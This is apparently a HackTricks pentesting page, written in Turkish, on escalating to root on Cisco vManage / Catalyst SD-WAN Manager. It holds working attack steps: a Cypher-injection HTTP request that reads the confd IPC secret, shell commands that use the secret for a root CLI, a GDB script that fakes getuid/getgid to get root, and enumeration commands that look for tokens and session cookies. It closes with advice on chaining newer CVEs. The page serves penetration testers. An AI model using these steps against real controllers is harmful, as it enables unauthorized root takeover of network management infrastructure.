# Cisco - vmanage

{{#include ../../banners/hacktricks-training.md}}

Cisco vManage / *Catalyst SD-WAN Manager* üzerinde `vmanage`, `netadmin` veya `vmanage-admin` olarak code execution elde ettiğinizde, en ilginç local privesc yüzeyleri genellikle `confd` CLI stack, `cmdptywrapper` helper, localhost REST APIs ve root-owned import/upload handlers olur.

Eğer controller üzerinde hâlâ **initial foothold** gerekiyorsa, önce özel control-plane sayfasına bakın:

{{#ref}}
../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
{{#endref}}

## Hızlı local triage
```bash
ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
ss -lntp | egrep '4565|830'
ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
```
Eğer `/etc/confd/confd_ipc_secret` foothold’unuzdan okunabiliyorsa, Path 1 ve Path 2 hemen uygulanabilir hale gelir.

## Path 1

(Örnek [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html) adresinden)

`confd` ve farklı binary’lerle ilgili bazı [documentation](http://66.218.245.39/doc/html/rn03re18.html) içinde biraz araştırma yaptıktan sonra (Cisco website üzerinde bir account ile erişilebilir), IPC socket’i authenticate etmek için `/etc/confd/confd_ipc_secret` konumunda bulunan bir secret kullandığını bulduk:
```
vmanage:~$ ls -al /etc/confd/confd_ipc_secret

-rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
```
Neo4j instance’ımızı hatırlıyor musun? Bu, `vmanage` kullanıcısının ayrıcalıkları altında çalışıyor; böylece önceki vulnerability’yi kullanarak dosyayı almamıza izin veriyor:
```
GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1

Host: vmanage-XXXXXX.viptela.net



[...]

"data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
```
`confd_cli` programı komut satırı argümanlarını desteklemez ancak argümanlarla birlikte `/usr/bin/confd_cli_user` çağırır. Bu nedenle, doğrudan kendi argüman kümemizle `/usr/bin/confd_cli_user` çağırabiliriz. Ancak mevcut yetkilerimizle okunabilir değil, bu yüzden onu rootfs’ten alıp `scp` kullanarak kopyalamamız, yardım çıktısını okumamız ve shell almak için kullanmamız gerekir:
```
vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret

vManage:~$ export CONFD_IPC_ACCESS_FILE=/tmp/ipc_secret

vManage:~$ /tmp/confd_cli_user -U 0 -G 0

Welcome to Viptela CLI

admin connected from 127.0.0.1 using console on vManage

vManage# vshell

vManage:~# id

uid=0(root) gid=0(root) groups=0(root)
```
## Yol 2

(Şuradaki örnekten [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))

synacktiv ekibinin blog¹ yazısı root shell elde etmek için zarif bir yol anlattı, ancak bunun bir dezavantajı var: `/usr/bin/confd_cli_user` kopyasını almayı gerektiriyor ve bu dosya yalnızca root tarafından okunabiliyor. Ben root'a yükselmek için böyle bir uğraşa gerek kalmadan başka bir yol buldum.

`/usr/bin/confd_cli` binary'sini disassemble ettiğimde, şunları gözlemledim:

<details>
<summary>UID/GID toplamasını gösteren Objdump</summary>
```asm
vmanage:~$ objdump -d /usr/bin/confd_cli
… snipped …
40165c: 48 89 c3              mov    %rax,%rbx
40165f: bf 1c 31 40 00        mov    $0x40311c,%edi
401664: e8 17 f8 ff ff        callq  400e80 <getenv@plt>
401669: 49 89 c4              mov    %rax,%r12
40166c: 48 85 db              test   %rbx,%rbx
40166f: b8 dc 30 40 00        mov    $0x4030dc,%eax
401674: 48 0f 44 d8           cmove  %rax,%rbx
401678: 4d 85 e4              test   %r12,%r12
40167b: b8 e6 30 40 00        mov    $0x4030e6,%eax
401680: 4c 0f 44 e0           cmove  %rax,%r12
401684: e8 b7 f8 ff ff        callq  400f40 <getuid@plt>  <-- HERE
401689: 89 85 50 e8 ff ff     mov    %eax,-0x17b0(%rbp)
40168f: e8 6c f9 ff ff        callq  401000 <getgid@plt>  <-- HERE
401694: 89 85 44 e8 ff ff     mov    %eax,-0x17bc(%rbp)
40169a: 8b bd 68 e8 ff ff     mov    -0x1798(%rbp),%edi
4016a0: e8 7b f9 ff ff        callq  401020 <ttyname@plt>
4016a5: c6 85 cf f7 ff ff 00  movb   $0x0,-0x831(%rbp)
4016ac: 48 85 c0              test   %rax,%rax
4016af: 0f 84 ad 03 00 00     je     401a62 <socket@plt+0x952>
4016b5: ba ff 03 00 00        mov    $0x3ff,%edx
4016ba: 48 89 c6              mov    %rax,%rsi
4016bd: 48 8d bd d0 f3 ff ff  lea    -0xc30(%rbp),%rdi
4016c4:   e8 d7 f7 ff ff           callq  400ea0 <*ABS*+0x32e9880f0b@plt>
… snipped …
```
</details>

“ps aux” çalıştırdığımda, aşağıdakini gözlemledim (_not -g 100 -u 107_)
```
vmanage:~$ ps aux
… snipped …
root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
… snipped …
```
“confd_cli” programının, oturum açmış kullanıcıdan topladığı user ID ve group ID’yi “cmdptywrapper” uygulamasına aktardığını varsaydım.

İlk denemem, “cmdptywrapper”ı doğrudan çalıştırıp ona `-g 0 -u 0` vermek oldu, ancak başarısız oldu. Görünüşe göre yol boyunca bir file descriptor (-i 1015) bir yerde oluşturulmuş ve bunu taklit edemiyorum.

synacktiv’in blogunda (son örnek) belirtildiği gibi, “confd_cli” programı command line argument desteklemiyor, ancak onu bir debugger ile etkileyebilirim ve neyse ki sistemde GDB bulunuyor.

API `getuid` ve `getgid` fonksiyonlarını 0 döndürecek şekilde zorladığım bir GDB scripti oluşturdum. Zaten deserialization RCE üzerinden “vmanage” privilege elde ettiğim için, `/etc/confd/confd_ipc_secret` dosyasını doğrudan okumaya yetkim var.

root.gdb:
```
set environment USER=root
define root
finish
set $rax=0
continue
end
break getuid
commands
root
end
break getgid
commands
root
end
run
```
<details>
<summary>Konsol çıktısı</summary>
```text
vmanage:/tmp$ gdb -x root.gdb /usr/bin/confd_cli
GNU gdb (GDB) 8.0.1
Copyright (C) 2017 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-poky-linux".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
Reading symbols from /usr/bin/confd_cli...(no debugging symbols found)...done.
Breakpoint 1 at 0x400f40
Breakpoint 2 at 0x401000Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401689 in ?? ()Breakpoint 2, getgid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401694 in ?? ()Breakpoint 1, getuid () at ../sysdeps/unix/syscall-template.S:59
59 T_PSEUDO_NOERRNO (SYSCALL_SYMBOL, SYSCALL_NAME, SYSCALL_NARGS)
0x0000000000401871 in ?? ()
Welcome to Viptela CLI
root connected from 127.0.0.1 using console on vmanage
vmanage# vshell
bash-4.4# whoami ; id
root
uid=0(root) gid=0(root) groups=0(root)
bash-4.4#
```
</details>

## Yol 3 (2025 CLI giriş doğrulama hatası - CVE-2025-20122)

Cisco daha sonra kendi advisory’sinde [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt) için daha temiz bir local root yolu belgeledi: **yalnızca read-only privileges sahibi authenticated attacker**, yetersiz input validation nedeniyle manager CLI’a crafted request gönderebilir ve root’a sıçrayabilirdi.

Offensive bir bakış açısından, çıkarılacak önemli ders şudur:

1. Kutuda *herhangi bir* düşük ayrıcalıklı foothold elde ettiğinizde, daha ağır Yol 1 / Yol 2 workflow’una geçmeden önce local CLI service’i test etmelisiniz.
2. Trust boundary’yi bulmak için Yol 2’deki artifact’leri yeniden kullanın: `confd_cli` → `cmdptywrapper` → `vshell`.
3. CLI backend’e iletilen her alanı şüpheli kabul edin: UID/GID, username, terminal metadata, imported files veya daha sonra root-owned helper tarafından tüketilen herhangi bir değer.
4. Düşük ayrıcalıklı bir kullanıcı local CLI socket’e erişebiliyor ve bu alanları etkileyebiliyorsa, root yalnızca bir crafted request uzakta olabilir.

Cihaza initial access sağladıktan sonraki pratik workflow şöyledir:
```bash
strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
ss -lntp | grep 4565
```
Bu, 2025 hatasını benzer sürümler için iyi bir avlanma desenine dönüştürür: **kimliği userland’de toplayıp daha yetkili bir wrapper’a ileten local CLI shims** arayın.

## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)

Cisco'nun Şubat 2026 advisory'si ayrıca başka bir faydalı privesc sınıfı tanıttı: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) bir **authenticated, local attacker with low privileges**'ın, REST API'deki yetersiz user-authentication mechanism nedeniyle root elde etmesine izin veriyordu.

Bu önemlidir çünkü vManage privesc artık yalnızca `confd`/TTY abuse ile sınırlı değil. Düşük yetkili bir shell aldıktan sonra ayrıca şunları da avlayın:

- çağırana fazla güvenen localhost-only API endpoints
- mevcut hesaptan okunabilen tokens, cookies veya service credentials
- yerel olarak hâlâ tetiklenebilen `dataservice`/REST handlers üzerinden açığa çıkan root-only actions

Pratikte, `vmanage` veya başka bir service user olarak bir shell aldıktan sonra, local API abuse çoğu zaman interactive CLI abuse'a göre daha sessizdir ve otomasyona dökmek daha kolaydır:
```bash
env | grep -iE 'token|cookie|session'
grep -R "dataservice" /etc /opt 2>/dev/null | head
ss -lntp | grep -E '(:443|:8443)'
```
Yerel oturum bağlamı ayrıcalıklı REST işlevselliğine ulaşmak için yeterliyse, API yolunu tercih et: stolen web sessions veya API tokens ile yeniden oynatmak, scriptlemek ve zincirlemek daha kolaydır.

## Path 5 (2026 crafted file processed by root - CVE-2026-20245)

Diğer yeni bir desen [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): `netadmin` ayrıcalıklarına sahip yerel bir attacker, CLI'nin daha sonra güvensiz şekilde işlediği **crafted file** yükleyebiliyordu; bu da `root` olarak command injection'a yol açıyordu.

HackTricks bakış açısından, değerli technique belirli CVE'den daha geniştir:

1. Dosya kabul eden her CLI veya web workflow'unu enumerate et: imports, diagnostic bundles, templates, validators, backups, tenant data, vb.
2. Yüklenen dosyanın nereye düştüğünü ve hangi root-owned script veya binary tarafından tüketildiğini izle.
3. Dosya adı, dosya içeriği veya parse edilmiş metadata'nın shell commands, wrapper scripts veya `system()`-style helpers'a hiç aktarılıp aktarılmadığını test et.
4. Eğer zaten `netadmin`'e ulaşabiliyorsan (geçerli creds, stolen session veya bir auth-bypass chain), file-processing bugs genellikle root'a giden en hızlı yoldur.

Bu bug class, `netadmin` verir ama `root` vermez olan remote footholds ile özellikle iyi zincirlenir.

## Zincirlemek için diğer yeni vManage/Catalyst SD-WAN Manager vulns

- **Authenticated UI XSS (CVE-2024-20475)** – web UI'de bir admin session'ını çal, sonra seni sonunda `vshell`'e veya yukarıdaki local privesc yollarından birine götüren API/CLI actions'a pivot et.
- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – 2026 crafted-file privesc için tam olarak gereken seviye `netadmin` olduğu için Path 5'e çok güçlü bir öncüdür.
- **Authenticated arbitrary file write (CVE-2026-20262)** – daha sonra privileged components tarafından parse edilen dosyaları bırakmak veya root-owned helpers tarafından tüketilen operational artifacts'ı overwrite etmek için kullanışlıdır.
- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – dedicated SD-WAN control-plane page'de daha iyi belgelenmiştir; `vmanage-admin` için bir SSH key ekleyebilir ve bu page'i yeniden ziyaret etmek için gereken local foothold'u sağlayabilir.

## References

- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)

{{#include ../../banners/hacktricks-training.md}}
